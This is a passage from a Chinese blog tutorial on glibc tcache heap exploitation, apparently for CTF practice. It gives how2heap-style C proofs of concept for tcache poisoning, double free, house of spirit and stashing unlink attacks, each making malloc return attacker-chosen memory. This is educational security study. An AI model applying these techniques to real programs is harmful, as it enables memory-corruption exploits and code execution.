class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//断点</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下断点之后，发现<code>malloc</code>三个堆块<code>fastbin</code>里面一个都没动，全部都是<code>tache</code>里面拿的</p><img src="/2021/10/05/tache-bin-attack/3.png" class=""><p>但是<code>tache</code>里面的拿完了之后，它就会去<code>fastbin</code>里面拿，拿了之后还没完还要把<code>fastbin</code>里面的堆块放到<code>tache</code>里面去，下面是代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//tache里面已经分配完</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/4.png" class=""><p>讲完了<code>tache</code>的一些原理性的东西，接下来看看如何攻击的：</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="libc-2-27-so"><a href="#libc-2-27-so" class="headerlink" title="libc-2.27.so"></a>libc-2.27.so</h3><h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>拿<code>how2heap</code>的代码来演示，目的是任意地址分配，分配到栈上的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配两个堆块之后，修改<code>b</code>的<code>fd</code>指针指向栈，如下图所示：</p><img src="/2021/10/05/tache-bin-attack/6.png" class=""><p>再分配两个堆块就获得了栈的控制权</p><img src="/2021/10/05/tache-bin-attack/5.png" class=""><p>总结一下：由于<code>tache</code>并不会检查同一链表里面的堆块大小是否相等，所以才可以把栈指针链入<code>tache</code>，然后再分配出来，这比<code>fastbin attack</code>方便多啦！，<code>fastbin attack</code>还得检查堆块大小，所以<code>fastbin attack</code>都是把<code>__malloc_hook - 0x23</code>链入再分配出来，对吧！</p><h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h4><p>这个攻击手法已经不太适用了，<code>tache_dup</code>很简单，就<code>free</code>两次，不赘述了，因为补丁已经给到了<code>libc-2.27.so</code>，上次打一道<code>tache</code>的题，很疑惑，为啥我的<code>tache_dup</code>就报错了呢？后面找到下面这个资料：</p><p><a href="https://blog.csdn.net/easy_level1/article/details/115724038">[总结型]记CTF PWN中过气的堆利用</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, b, c);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h4><p>这个攻击手法看起来很离谱，只是单纯的一个数组并伪造了一个<code>size</code>，然后定义了一个指针指向了此数组的<code>&amp;fake_chunks[2]</code>，在<code>free</code>就把它给放进了<code>tache</code>…，原因是由于<code>tcache_put()</code>函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的<code>malloc</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是<code>fake_chunks</code>，可以看到伪造了个<code>size</code>：</p><img src="/2021/10/05/tache-bin-attack/7.png" class=""><p><code>free</code>之后就能看到<code>tache</code>里面有这个堆块了，再申请出来就得到了此块地址的控制器：</p><img src="/2021/10/05/tache-bin-attack/8.png" class=""><h4 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h4><p>这个攻击手法就稍微精巧一点，没有之前的这么简单粗暴，我们一步步来看！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//查看地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>stack_var[3]</code>放<code>&amp;stack_var[2]</code>的原因是为了绕过<code>unlink</code>的检查，<code>bck-&gt;fd = bin;</code>和<code>bin-&gt;bk = bck;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>申请了<code>9</code>个<code>0x90</code>大小的堆块，并把他们都放进了<code>chunk_lis</code>这个数组里面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再<code>free</code>掉<code>6</code>个堆块，再<code>free</code>掉一个之后<code>tache</code>就满了，再往下<code>free</code>的堆块就将进到<code>unsorted bin</code>里面，<code>chunk_lis[0]</code>和<code>chunk_lis[0]</code>为什么要隔开呢？是怕它俩合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//last tcache bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/9.png" class=""><p>之后分配一个<code>0xa0</code>大小的堆块，它会先到<code>tache bin</code>里面寻找，发现并没有这个大小的堆块，又到<code>unsorted bin</code>里面找，还是没找到，没找到归没找到，它还是会把<code>unsorted bin</code>里面的堆块整理到对应大小的<code>bin</code>中，所以<code>chunk_lis[0]</code>和<code>chunk_lis[2]</code>会进到<code>small bin</code>，由于在<code>bin</code>中没有这个大小的堆块，所以它直接调用<code>brk</code>来创建堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/10.png" class=""><p>此时<code>malloc 0x90</code>就是直接从<code>tache</code>里面拿，为什么要这样做呢？是为了给<code>chunk_lis[0]</code>和<code>chunk_lis[2]</code>留出位置，等会就能看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>之后把<code>chunk3</code>也就是<code>0x603390</code>这个堆块的<code>bk</code>修改成<code>stack_var</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/tache-bin-attack/11.png" 